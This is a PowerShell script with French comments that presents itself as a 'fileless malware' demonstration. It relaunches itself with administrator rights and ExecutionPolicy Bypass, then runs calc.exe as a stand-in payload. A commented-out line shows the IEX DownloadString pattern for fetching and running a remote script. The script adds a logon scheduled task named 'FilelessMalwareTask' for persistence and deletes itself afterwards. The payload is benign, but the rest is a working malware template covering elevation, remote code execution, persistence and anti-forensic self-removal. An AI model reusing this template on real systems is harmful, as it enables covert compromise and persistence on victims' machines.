# Vérifie si le script est lancé en mode Administrateur
If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File """ + $MyInvocation.MyCommand.Definition + """"
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    Exit
}

Write-Output "Script exécuté avec les droits administrateurs."

# Charge utile : Lance la calculatrice (ou exécute une commande distante)
Write-Output "Chargement de la charge utile..."
Start-Process "calc.exe"
# OU télécharge un script à distance pour exécution
# IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ton_nom_utilisateur/ton_repo/main/script.ps1')

# Ajout d'une tâche planifiée pour persistance
Write-Output "Ajout d'une tâche planifiée..."
$TaskName = "FilelessMalwareTask"
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command Start-Process calc.exe"
$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Description "Lance une charge utile bénigne au démarrage."
Write-Output "Tâche planifiée ajoutée avec succès."

# Suppression automatique après exécution
Write-Output "Suppression automatique du script..."
Start-Sleep -Seconds 2
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
Write-Output "Script supprimé avec succès."
